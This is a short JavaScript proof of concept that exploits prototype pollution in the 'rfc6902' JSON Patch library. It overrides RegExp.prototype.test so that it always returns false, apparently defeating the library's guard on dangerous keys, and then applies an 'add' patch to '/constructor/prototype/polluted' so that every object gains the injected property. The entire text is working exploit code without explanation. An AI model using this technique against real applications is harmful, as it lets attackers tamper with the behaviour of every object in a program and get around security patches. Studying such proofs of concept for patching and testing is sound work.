RegExp.prototype.test = () => false;
console.log({}.polluted);
var rfc6902 = require('rfc6902');
var obj = {};
rfc6902.applyPatch(obj, [{
        op: 'add',
        path: '/constructor/prototype/polluted',
        value: 'yes'
    }]);
console.log({}.polluted);